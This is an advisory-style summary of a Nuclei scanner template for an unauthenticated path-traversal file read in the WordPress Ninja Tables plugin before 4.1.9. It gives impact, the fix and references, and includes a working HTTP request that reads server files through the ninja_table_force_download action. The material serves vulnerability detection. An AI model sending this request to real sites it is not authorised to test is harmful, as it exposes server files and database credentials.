# Nuclei Template: Ninja Tables <4.1.9 - Unauthenticated Arbitrary File Read
**Template ID:** wp-ninja-tables-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`wp-ninja-tables-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The Ninja Tables plugin for WordPress (versions < 4.1.9) is vulnerable to an unauthenticated arbitrary file download vulnerability. The issue exists due to the improper validation of the 'url' parameter in the 'ninja_table_force_download' AJAX action.

## Impact
An unauthenticated attacker can download sensitive files from the server, such as '/etc/passwd' or '/wp-config.php', potentially exposing sensitive information including database credentials.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce={{public_nonce}} HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Update the Ninja Tables plugin to version 4.1.9 or later.

## References
- https://xbow.com/blog/xbow-ninja-tables/
- https://ninjatables.com/docs/change-log/#521-date-july-9-2025
